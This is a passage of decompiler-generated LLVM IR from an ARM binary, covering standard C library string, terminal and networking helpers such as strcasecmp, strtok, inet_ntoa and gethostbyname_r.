}

define i32 @__GI_strcasecmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_11c40

dec_label_pc_11c40:                               ; preds = %bb8, %entry
  %v8_11ca43 = phi i32 [ %v8_11ca4, %bb8 ], [ 0, %entry ]
  %v0_11c98 = phi i32 [ %v1_11c98, %bb8 ], [ %arg2, %entry ]
  %v0_11c9c = phi i32 [ %v1_11c9c, %bb8 ], [ %tmp, %entry ]
  %v9_11c40 = icmp eq i32 %v0_11c9c, %v0_11c98
  br i1 %v9_11c40, label %dec_label_pc_11c40._crit_edge, label %dec_label_pc_11c48

dec_label_pc_11c40._crit_edge:                    ; preds = %dec_label_pc_11c40
  %.pre = inttoptr i32 %v0_11c98 to i8*
  br label %bb8

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11c40
  %v1_11c4c = inttoptr i32 %v0_11c9c to i8*
  %v2_11c4c = load i8, i8* %v1_11c4c, align 1
  %v3_11c4c = zext i8 %v2_11c4c to i32
  %v1_11c50 = inttoptr i32 %v0_11c98 to i8*
  %v2_11c50 = load i8, i8* %v1_11c50, align 1
  %v3_11c50 = zext i8 %v2_11c50 to i32
  %v2_11c54 = load i32, i32* bitcast (i32** @global_var_22824.418 to i32*), align 4
  %v2_11c58 = mul nuw nsw i32 %v3_11c4c, 2
  store i32 %v2_11c58, i32* @ip, align 4
  %v2_11c5c = mul nuw nsw i32 %v3_11c50, 2
  %v2_11c60 = add i32 %v2_11c5c, %v2_11c54
  %v2_11c64 = add i32 %v2_11c54, %v2_11c58
  %v1_11c68 = add i32 %v2_11c64, 1
  %v2_11c68 = inttoptr i32 %v1_11c68 to i8*
  %v3_11c68 = load i8, i8* %v2_11c68, align 1
  %v4_11c68 = zext i8 %v3_11c68 to i32
  %v1_11c6c = add i32 %v2_11c60, 1
  %v2_11c6c = inttoptr i32 %v1_11c6c to i8*
  %v3_11c6c = load i8, i8* %v2_11c6c, align 1
  %v4_11c6c = zext i8 %v3_11c6c to i32
  %v3_11c70 = inttoptr i32 %v2_11c60 to i8*
  %v4_11c70 = load i8, i8* %v3_11c70, align 1
  %v6_11c70 = zext i8 %v4_11c70 to i32
  %v3_11c74 = inttoptr i32 %v2_11c64 to i8*
  %v4_11c74 = load i8, i8* %v3_11c74, align 1
  %v6_11c74 = zext i8 %v4_11c74 to i32
  %v3_11c78 = mul nuw i32 %v4_11c6c, 16777216
  %v3_11c7c = mul nuw i32 %v4_11c68, 16777216
  %v4_11c80 = sdiv i32 %v3_11c7c, 65536
  %v5_11c80 = or i32 %v6_11c74, %v4_11c80
  %v4_11c84 = sdiv i32 %v3_11c78, 65536
  %v5_11c84 = or i32 %v4_11c84, %v6_11c70
  %v2_11c88 = sub nsw i32 %v5_11c80, %v5_11c84
  %v9_11c88 = icmp eq i32 %v5_11c80, %v5_11c84
  br i1 %v9_11c88, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_11c48
  ret i32 %v2_11c88

bb8:                                              ; preds = %dec_label_pc_11c40._crit_edge, %dec_label_pc_11c48
  %v1_11c90.pre-phi = phi i8* [ %.pre, %dec_label_pc_11c40._crit_edge ], [ %v1_11c4c, %dec_label_pc_11c48 ]
  %v8_11ca4 = phi i32 [ %v8_11ca43, %dec_label_pc_11c40._crit_edge ], [ %v2_11c88, %dec_label_pc_11c48 ]
  %v2_11c90 = load i8, i8* %v1_11c90.pre-phi, align 1
  %v2_11c94 = icmp eq i8 %v2_11c90, 0
  %v1_11c98 = add i32 %v0_11c98, 1
  %v1_11c9c = add i32 %v0_11c9c, 1
  store i32 %v1_11c9c, i32* @lr, align 4
  br i1 %v2_11c94, label %dec_label_pc_11ca4, label %dec_label_pc_11c40

dec_label_pc_11ca4:                               ; preds = %bb8
  ret i32 %v8_11ca4

; uselistorder directives
  uselistorder i32 %v1_11c9c, { 1, 0 }
  uselistorder i32 %v2_11c88, { 1, 0 }
  uselistorder i32 %v5_11c84, { 1, 0 }
  uselistorder i32 %v5_11c80, { 1, 0 }
  uselistorder i32 %v2_11c58, { 1, 0 }
  uselistorder i32 %v0_11c98, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @strcasestr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v1_11cc016 = inttoptr i32 %arg2 to i8*
  br label %dec_label_pc_11cc0.outer

dec_label_pc_11cc0.outer:                         ; preds = %dec_label_pc_11d28, %entry
  %v0_11cd4.ph = phi i32 [ %v1_11d28, %dec_label_pc_11d28 ], [ %tmp, %entry ]
  %v2_11cc017 = load i8, i8* %v1_11cc016, align 1
  %v2_11cc419 = icmp eq i8 %v2_11cc017, 0
  br i1 %v2_11cc419, label %dec_label_pc_11cd4, label %dec_label_pc_11cdc

dec_label_pc_11cd4:                               ; preds = %dec_label_pc_11cc0.backedge, %dec_label_pc_11cc0.outer
  ret i32 %v0_11cd4.ph

dec_label_pc_11cdc:                               ; preds = %dec_label_pc_11cc0.outer, %dec_label_pc_11cc0.backedge
  %v1_11ccc25.in = phi i32 [ %v1_11ccc25, %dec_label_pc_11cc0.backedge ], [ %arg2, %dec_label_pc_11cc0.outer ]
  %v2_11cc023 = phi i8 [ %v2_11cc0, %dec_label_pc_11cc0.backedge ], [ %v2_11cc017, %dec_label_pc_11cc0.outer ]
  %v2_11cc824.in.in = phi i8 [ %v2_11cc0, %dec_label_pc_11cc0.backedge ], [ %v2_11cc017, %dec_label_pc_11cc0.outer ]
  %v0_11ce422 = phi i32 [ %v1_11ce4, %dec_label_pc_11cc0.backedge ], [ %v0_11cd4.ph, %dec_label_pc_11cc0.outer ]
  %v1_11ccc25 = add i32 %v1_11ccc25.in, 1
  %v1_11cdc = inttoptr i32 %v0_11ce422 to i8*
  %v2_11cdc = load i8, i8* %v1_11cdc, align 1
  %v9_11ce0 = icmp eq i8 %v2_11cc023, %v2_11cdc
  %v1_11ce4 = add i32 %v0_11ce422, 1
  br i1 %v9_11ce0, label %dec_label_pc_11cc0.backedge, label %dec_label_pc_11cf0

dec_label_pc_11cc0.backedge:                      ; preds = %dec_label_pc_11cdc, %dec_label_pc_11cf0
  %v1_11cc0 = inttoptr i32 %v1_11ccc25 to i8*
  %v2_11cc0 = load i8, i8* %v1_11cc0, align 1
  %v2_11cc4 = icmp eq i8 %v2_11cc0, 0
  br i1 %v2_11cc4, label %dec_label_pc_11cd4, label %dec_label_pc_11cdc

dec_label_pc_11cf0:                               ; preds = %dec_label_pc_11cdc
  %v2_11cc824.in = zext i8 %v2_11cc824.in.in to i32
  %v3_11cdc = zext i8 %v2_11cdc to i32
  %v2_11ce8 = mul nuw nsw i32 %v3_11cdc, 2
  %v2_11cc824 = mul nuw nsw i32 %v2_11cc824.in, 2
  %v2_11cf4 = load i32, i32* bitcast (i32** @global_var_22824.418 to i32*), align 4
  %v2_11cf8 = add i32 %v2_11cf4, %v2_11ce8
  %v2_11cfc = add i32 %v2_11cf4, %v2_11cc824
  %v1_11d00 = add i32 %v2_11cfc, 1
  %v2_11d00 = inttoptr i32 %v1_11d00 to i8*
  %v3_11d00 = load i8, i8* %v2_11d00, align 1
  %v4_11d00 = zext i8 %v3_11d00 to i32
  %v1_11d04 = add i32 %v2_11cf8, 1
  %v2_11d04 = inttoptr i32 %v1_11d04 to i8*
  %v3_11d04 = load i8, i8* %v2_11d04, align 1
  %v4_11d04 = zext i8 %v3_11d04 to i32
  %v3_11d08 = inttoptr i32 %v2_11cf8 to i8*
  %v4_11d08 = load i8, i8* %v3_11d08, align 1
  %v6_11d08 = zext i8 %v4_11d08 to i32
  %v3_11d0c = inttoptr i32 %v2_11cfc to i8*
  %v4_11d0c = load i8, i8* %v3_11d0c, align 1
  %v6_11d0c = zext i8 %v4_11d0c to i32
  %v3_11d10 = mul nuw i32 %v4_11d00, 16777216
  %v3_11d14 = mul nuw i32 %v4_11d04, 16777216
  %v4_11d18 = sdiv i32 %v3_11d10, 65536
  %v5_11d18 = or i32 %v6_11d0c, %v4_11d18
  %v4_11d1c = sdiv i32 %v3_11d14, 65536
  %v5_11d1c = or i32 %v4_11d1c, %v6_11d08
  %v9_11d20 = icmp eq i32 %v5_11d18, %v5_11d1c
  br i1 %v9_11d20, label %dec_label_pc_11cc0.backedge, label %dec_label_pc_11d28

dec_label_pc_11d28:                               ; preds = %dec_label_pc_11cf0
  %v1_11d28 = add i32 %v0_11cd4.ph, 1
  %v2_11d2c = icmp eq i8 %v2_11cdc, 0
  br i1 %v2_11d2c, label %dec_label_pc_11d3c, label %dec_label_pc_11cc0.outer

dec_label_pc_11d3c:                               ; preds = %dec_label_pc_11d28
  ret i32 0

; uselistorder directives
  uselistorder i8 %v2_11cc0, { 2, 1, 0 }
  uselistorder i8 %v2_11cdc, { 0, 2, 1 }
  uselistorder i32 %v0_11ce422, { 1, 0 }
  uselistorder i32 %v0_11cd4.ph, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11cc0.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_11cdc, { 1, 0 }
}

define i32 @__GI_strtok(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_28890.421 to i32), i32* @r2, align 4
  %v0_11d4c = call i32 @strtok_r()
  %v0_11d50 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11d50, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11d4c

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @isatty(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %v2_11d58 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_11d58, i32* @r1, align 4
  %v0_11d60 = call i32 @__GI_tcgetattr()
  %v1_11d64 = sub i32 1, %v0_11d60
  %v2_11d64 = icmp ult i32 %v0_11d60, 2
  br i1 %v2_11d64, label %bb4, label %bb

bb:                                               ; preds = %entry
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11d70 = phi i32 [ %v1_11d64, %entry ], [ 0, %bb ]
  ret i32 %v5_11d70

; uselistorder directives
  uselistorder i32 %v0_11d60, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_tcgetattr() local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_11d74 = load i32, i32* @r4, align 4
  %v6_11d74 = load i32, i32* @r5, align 4
  %v2_11d78 = ptrtoint i32* %stack_var_-56 to i32
  %v0_11d7c = load i32, i32* @r1, align 4
  store i32 %v0_11d7c, i32* %r6.global-to-local, align 4
  %v0_11d88 = load i32, i32* @r0, align 4
  %v3_11d88 = call i32 @ioctl(i32 %v0_11d88, i32 21505, i32 %v2_11d78)
  store i32 %v3_11d88, i32* %r7.global-to-local, align 4
  %v2_11d8c = icmp eq i32 %v3_11d88, 0
  %v2_11d94 = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_11d94, i32* @r1, align 4
  %v0_11d9c = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_11d8c, label %dec_label_pc_11da4, label %dec_label_pc_11dd0

dec_label_pc_11da4:                               ; preds = %entry
  %v1_11d9c = add i32 %v0_11d9c, 17
  %v4_11dac = zext i8 %tmp to i32
  store i32 %v4_11dac, i32* @r5, align 4
  %v2_11db0 = load i32, i32* %stack_var_-56, align 4
  %v1_11db4 = inttoptr i32 %v0_11d9c to i32*
  store i32 %v2_11db0, i32* %v1_11db4, align 4
  %v3_11db4 = add i32 %v0_11d9c, 4
  %v4_11db4 = inttoptr i32 %v3_11db4 to i32*
  %v5_11db4 = load i32, i32* @ip, align 4
  store i32 %v5_11db4, i32* %v4_11db4, align 4
  %v6_11db4 = add i32 %v0_11d9c, 8
  %v7_11db4 = inttoptr i32 %v6_11db4 to i32*
  %v8_11db4 = load i32, i32* @lr, align 4
  store i32 %v8_11db4, i32* %v7_11db4, align 4
  %v0_11db8 = load i32, i32* @r4, align 4
  %v1_11db8 = load i32, i32* %r6.global-to-local, align 4
  %v2_11db8 = add i32 %v1_11db8, 12
  %v3_11db8 = inttoptr i32 %v2_11db8 to i32*
  store i32 %v0_11db8, i32* %v3_11db8, align 4
  %v0_11dbc = load i32, i32* @r5, align 4
  %v1_11dbc = trunc i32 %v0_11dbc to i8
  %v2_11dbc = load i32, i32* %r6.global-to-local, align 4
  %v3_11dbc = add i32 %v2_11dbc, 16
  %v4_11dbc = inttoptr i32 %v3_11dbc to i8*
  store i8 %v1_11dbc, i8* %v4_11dbc, align 1
  %v4_11dc0 = call i32 @__GI_mempcpy(i32 %v1_11d9c, i32 %v2_11d94, i32 19, i32 %v2_11db0)
  %v0_11dc4 = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_11dcc = inttoptr i32 %v4_11dc0 to i8*
  %v3_11dcc = call i32 @__GI_memset(i8* %v2_11dcc, i32 %v0_11dc4)
  br label %dec_label_pc_11dd0

dec_label_pc_11dd0:                               ; preds = %entry, %dec_label_pc_11da4
  %v0_11dd0 = phi i32 [ %v3_11d88, %entry ], [ %v0_11dc4, %dec_label_pc_11da4 ]
  store i32 %v3_11d74, i32* @r4, align 4
  store i32 %v6_11d74, i32* @r5, align 4
  ret i32 %v0_11dd0

; uselistorder directives
  uselistorder i32 %v0_11d9c, { 2, 1, 0, 3 }
  uselistorder i32 19, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11dd0, { 1, 0 }
}

define i32 @ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_11dfc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_11dfc
}

define i32 @ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11e0c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_11e10 = urem i32 %tmp1, 256
  %v5_11e10 = or i32 %v4_11e10, %v1_11e0c
  ret i32 %v5_11e10

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v2_11e34 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_11e34
}

define i32 @htons(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = mul i32 %arg1, 256
  %v1_11e44 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_11e48 = urem i32 %tmp1, 256
  %v5_11e48 = or i32 %v4_11e48, %v1_11e44
  ret i32 %v5_11e48

; uselistorder directives
  uselistorder i32 65280, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v3_11e50 = load i32, i32* @r4, align 4
  %v6_11e50 = load i32, i32* @r5, align 4
  %v9_11e50 = load i32, i32* @r6, align 4
  %v0_11e54 = load i32, i32* @r0, align 4
  %v2_11e74 = call i32 @llvm.bswap.i32(i32 %v0_11e54)
  %v0_11e78 = load i32, i32* @r1, align 4
  %v1_11e78 = add i32 %v0_11e78, 15
  store i32 %v1_11e78, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11ea4

dec_label_pc_11e84:                               ; preds = %dec_label_pc_11ea4
  %v1_11ea8 = urem i32 %v0_11eb8, 256
  store i32 0, i32* %ip.global-to-local, align 4
  %v5_11e8c = inttoptr i32 %v0_11ec4 to i8*
  %v6_11e8c = call i32 @_uintmaxtostr(i8* %v5_11e8c, i32 %v1_11ea8, i32 0, i32 -10, i32 0)
  %v0_11e90 = load i32, i32* @r6, align 4
  %v2_11e90 = icmp eq i32 %v0_11e90, 0
  %v1_11e94 = add i32 %v6_11e8c, -1
  store i32 %v1_11e94, i32* %ip.global-to-local, align 4
  br i1 %v2_11e90, label %dec_label_pc_11ea4.backedge, label %bb

dec_label_pc_11ea4.backedge:                      ; preds = %bb, %dec_label_pc_11e84
  %storemerge.pre = phi i32 [ %storemerge.pre.pre, %bb ], [ %v1_11e94, %dec_label_pc_11e84 ]
  %v0_11ea4.pre = load i32, i32* @r5, align 4
  %v0_11ea8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_11ea4

bb:                                               ; preds = %dec_label_pc_11e84
  %v4_11e9c = inttoptr i32 %v0_11e90 to i8*
  store i8 46, i8* %v4_11e9c, align 1
  %storemerge.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11ea4.backedge

dec_label_pc_11ea4:                               ; preds = %dec_label_pc_11ea4.backedge, %entry
  %v0_11ec4 = phi i32 [ %v1_11e78, %entry ], [ %storemerge.pre, %dec_label_pc_11ea4.backedge ]
  %storemerge = phi i32 [ 0, %entry ], [ %storemerge.pre, %dec_label_pc_11ea4.backedge ]
  %v0_11eb8 = phi i32 [ %v2_11e74, %entry ], [ %v0_11ea8.pre, %dec_label_pc_11ea4.backedge ]
  %v0_11ebc = phi i32 [ 0, %entry ], [ %v0_11ea4.pre, %dec_label_pc_11ea4.backedge ]
  store i32 %storemerge, i32* @r6, align 4
  %v7_11ea4 = icmp eq i32 %v0_11ebc, 3
  store i1 %v7_11ea4, i1* @cpsr_z, align 1
  %v3_11eb8 = udiv i32 %v0_11eb8, 256
  store i32 %v3_11eb8, i32* @r4, align 4
  %v1_11ebc = add i32 %v0_11ebc, 1
  store i32 %v1_11ebc, i32* @r5, align 4
  %v7_11ec0 = icmp sgt i32 %v0_11ebc, 3
  br i1 %v7_11ec0, label %dec_label_pc_11ec4, label %dec_label_pc_11e84

dec_label_pc_11ec4:                               ; preds = %dec_label_pc_11ea4
  %v1_11ec4 = add i32 %v0_11ec4, 1
  store i32 %v3_11e50, i32* @r4, align 4
  store i32 %v6_11e50, i32* @r5, align 4
  store i32 %v9_11e50, i32* @r6, align 4
  ret i32 %v1_11ec4

; uselistorder directives
  uselistorder i32 %v0_11ebc, { 2, 0, 1 }
  uselistorder i32 (i8*, i32, i32, i32, i32)* @_uintmaxtostr, { 2, 0, 1 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_28894.424 to i32), i32* @r1, align 4
  %v0_11ed4 = call i32 @__GI_inet_ntoa_r()
  %v0_11ed8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11ed8, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11ed4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_11ee0 = ptrtoint i32* %stack_var_-8 to i32
  %v0_11ee8 = load i32, i32* @r0, align 4
  %v2_11ee8 = inttoptr i32 %v0_11ee8 to i8*
  %v3_11ee8 = call i32 @inet_aton(i8* %v2_11ee8, i32 %v2_11ee0)
  %v2_11eec = icmp eq i32 %v3_11ee8, 0
  br i1 %v2_11eec, label %bb4, label %bb

bb:                                               ; preds = %entry
  %v3_11ef4 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v5_11efc = phi i32 [ -1, %entry ], [ %v3_11ef4, %bb ]
  ret i32 %v5_11efc

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_11f00 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_11f0c = call i32 @__GI___h_errno_location()
  %v2_11f10 = ptrtoint i32* %stack_var_-12 to i32
  store i32 %v2_11f10, i32* @ip, align 4
  %v0_11f1c = load i32, i32* @r4, align 4
  %v7_11f2c = call i32 @gethostbyname_r(i32 %v0_11f1c, i32* nonnull @global_var_28a70.426, i32 ptrtoint (i32* @global_var_288a4.428 to i32), i32 460, i32 %v2_11f10, i32 %v0_11f0c)
  %v3_11f30 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_11f00, i32* @r4, align 4
  ret i32 %v3_11f30
}

define i32 @gethostbyname_r(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_11f44 = load i32, i32* @r5, align 4
  %v9_11f44 = load i32, i32* @r6, align 4
  %v12_11f44 = load i32, i32* @r7, align 4
  %v15_11f44 = load i32, i32* @r8, align 4
  %v18_11f44 = load i32, i32* @sb, align 4
  %v21_11f44 = load i32, i32* @sl, align 4
  %v24_11f44 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_11f54 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_11f54, i32* @fp, align 4
  %v2_11f54 = icmp eq i32 %v0_11f54, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_11f64 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_11f64, align 4
  br i1 %v2_11f54, label %bb, label %dec_label_pc_11f70

bb:                                               ; preds = %entry
  %v1_11f68 = load i32, i32* %r0.global-to-local, align 4
  %v2_11f68 = add i32 %v1_11f68, 22
  store i32 %v2_11f68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12294

dec_label_pc_11f70:                               ; preds = %entry
  %v0_11f70 = call i32 @__errno_location()
  store i32 %v0_11f70, i32* %r0.global-to-local, align 4
  %v3_11f74 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_11f74, i32* %ip.global-to-local, align 4
  %v1_11f78 = inttoptr i32 %v0_11f70 to i32*
  %v2_11f78 = load i32, i32* %v1_11f78, align 4
  store i32 %v2_11f78, i32* @r8, align 4
  %v0_11f7c = load i32, i32* @r6, align 4
  store i32 %v0_11f7c, i32* %v1_11f78, align 4
  %v0_11f80 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_11f70, i32* @r5, align 4
  %v0_11f90 = load i32, i32* @fp, align 4
  store i32 %v0_11f90, i32* %r0.global-to-local, align 4
  %v0_11f94 = load i32, i32* @sl, align 4
  store i32 %v0_11f94, i32* %r2.global-to-local, align 4
  %v0_11f98 = load i32, i32* @r7, align 4
  store i32 %v0_11f98, i32* %r3.global-to-local, align 4
  %v0_11f9c = load i32, i32* @r4, align 4
  %v7_11fa4 = call i32 @__get_hosts_byname_r(i32 %v0_11f90, i32 2, i32 %v0_11f94, i32 %v0_11f98, i32 %v0_11f9c, i32 %v0_11f80, i32 %arg6)
  store i32 %v7_11fa4, i32* %r0.global-to-local, align 4
  %v2_11fa8 = icmp eq i32 %v7_11fa4, 0
  br i1 %v2_11fa8, label %dec_label_pc_12294, label %dec_label_pc_11fb0

dec_label_pc_11fb0:                               ; preds = %dec_label_pc_11f70
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_11fb4 = inttoptr i32 %arg6 to i32*
  %v2_11fb4 = load i32, i32* %v1_11fb4, align 4
  store i32 %v2_11fb4, i32* %r3.global-to-local, align 4
  %v7_11fb8 = icmp eq i32 %v2_11fb4, 1
  br i1 %v7_11fb8, label %dec_label_pc_11fdc, label %dec_label_pc_11fc0

dec_label_pc_11fc0:                               ; preds = %dec_label_pc_11fb0
  %v7_11fc0 = icmp eq i32 %v2_11fb4, 4
  br i1 %v7_11fc0, label %dec_label_pc_11fdc, label %dec_label_pc_11fc8

dec_label_pc_11fc8:                               ; preds = %dec_label_pc_11fc0
  %v3_11fc8 = icmp eq i32 %v2_11fb4, -1
  br i1 %v3_11fc8, label %dec_label_pc_11fd0, label %dec_label_pc_12294

dec_label_pc_11fd0:                               ; preds = %dec_label_pc_11fc8
  %v0_11fd0 = load i32, i32* @r5, align 4
  %v1_11fd0 = inttoptr i32 %v0_11fd0 to i32*
  %v2_11fd0 = load i32, i32* %v1_11fd0, align 4
  store i32 %v2_11fd0, i32* %r3.global-to-local, align 4
  %v7_11fd4 = icmp eq i32 %v2_11fd0, 2
  br i1 %v7_11fd4, label %dec_label_pc_11fdc, label %dec_label_pc_12294

dec_label_pc_11fdc:                               ; preds = %dec_label_pc_11fd0, %dec_label_pc_11fc0, %dec_label_pc_11fb0
  %v0_11fdc = load i32, i32* @r7, align 4
  %v1_11fdc = sub i32 0, %v0_11fdc
  %v1_11fe0 = urem i32 %v1_11fdc, 4
  store i32 %v1_11fe0, i32* %r3.global-to-local, align 4
  %v2_11fe0 = icmp eq i32 %v1_11fe0, 0
  %v0_11fe4 = load i32, i32* @r8, align 4
  %v1_11fe4 = load i32, i32* @r5, align 4
  %v2_11fe4 = inttoptr i32 %v1_11fe4 to i32*
  store i32 %v0_11fe4, i32* %v2_11fe4, align 4
  %v0_12004.pre = load i32, i32* @r4, align 4
  br i1 %v2_11fe0, label %dec_label_pc_11ffc, label %dec_label_pc_11fec

dec_label_pc_11fec:                               ; preds = %dec_label_pc_11fdc
  %v1_11fec = load i32, i32* %r3.global-to-local, align 4
  %v2_11fec = sub i32 %v0_12004.pre, %v1_11fec
  %v3_11fec = icmp ult i32 %v0_12004.pre, %v1_11fec
  br i1 %v3_11fec, label %dec_label_pc_12290, label %dec_label_pc_11ff4

dec_label_pc_11ff4:                               ; preds = %dec_label_pc_11fec
  store i32 %v2_11fec, i32* @r4, align 4
  %v0_11ff8 = load i32, i32* @r7, align 4
  %v2_11ff8 = add i32 %v0_11ff8, %v1_11fec
  store i32 %v2_11ff8, i32* @r7, align 4
  br label %dec_label_pc_11ffc

dec_label_pc_11ffc:                               ; preds = %dec_label_pc_11fdc, %dec_label_pc_11ff4
  %v0_12004 = phi i32 [ %v2_11fec, %dec_label_pc_11ff4 ], [ %v0_12004.pre, %dec_label_pc_11fdc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @ip, align 4
  store i32 -1, i32* %v1_11fb4, align 4
  %tmp31 = icmp ult i32 %v0_12004, 4
  br i1 %tmp31, label %dec_label_pc_12290, label %dec_label_pc_12010

dec_label_pc_12010:                               ; preds = %dec_label_pc_11ffc
  %v0_12010 = load i32, i32* @r4, align 4
  %v1_12010 = add i32 %v0_12010, -4
  store i32 %v1_12010, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_12010, 8
  br i1 %tmp32, label %dec_label_pc_12290, label %dec_label_pc_1201c

dec_label_pc_1201c:                               ; preds = %dec_label_pc_12010
  %v1_1201c = add i32 %v0_12010, -12
  store i32 %v1_1201c, i32* %r3.global-to-local, align 4
  %v0_12020 = load i32, i32* @r7, align 4
  %v1_12020 = add i32 %v0_12020, 4
  store i32 %v1_12020, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_1202c = inttoptr i32 %v1_12020 to i32*
  store i32 %v0_12020, i32* %v3_1202c, align 4
  %v0_12030 = load i32, i32* @r5, align 4
  %v1_12030 = load i32, i32* @sb, align 4
  %v2_12030 = add i32 %v1_12030, 4
  %v3_12030 = inttoptr i32 %v2_12030 to i32*
  store i32 %v0_12030, i32* %v3_12030, align 4
  %tmp33 = icmp ult i32 %v1_1201c, 32
  br i1 %tmp33, label %dec_label_pc_12290, label %dec_label_pc_12038

dec_label_pc_12038:                               ; preds = %dec_label_pc_1201c
  %v0_12038 = load i32, i32* @r4, align 4
  %v1_12038 = add i32 %v0_12038, -44
  store i32 %v1_12038, i32* @r8, align 4
  %tmp34 = icmp ult i32 %v1_12038, 256
  br i1 %tmp34, label %dec_label_pc_12290, label %dec_label_pc_12044

dec_label_pc_12044:                               ; preds = %dec_label_pc_12038
  %v0_12044 = load i32, i32* @r7, align 4
  %v1_12044 = add i32 %v0_12044, 44
  store i32 %v1_12044, i32* @r6, align 4
  %v1_12048 = add i32 %v0_12044, 12
  store i32 %v1_12048, i32* %r3.global-to-local, align 4
  %v0_1204c = load i32, i32* @fp, align 4
  store i32 %v0_1204c, i32* @r1, align 4
  store i32 %v1_12038, i32* %r2.global-to-local, align 4
  store i32 %v1_12044, i32* %r0.global-to-local, align 4
  %v3_1205c = call i32 @strncpy(i32 %v1_12044, i32 %v0_1204c, i32 %v1_12038)
  store i32 %v1_12048, i32* %ip.global-to-local, align 4
  %v0_12064 = load i32, i32* @r6, align 4
  %v1_12064 = load i32, i32* @r7, align 4
  %v2_12064 = add i32 %v1_12064, 12
  %v3_12064 = inttoptr i32 %v2_12064 to i32*
  store i32 %v0_12064, i32* %v3_12064, align 4
  %v0_12068 = load i32, i32* @fp, align 4
  store i32 %v0_12068, i32* %r0.global-to-local, align 4
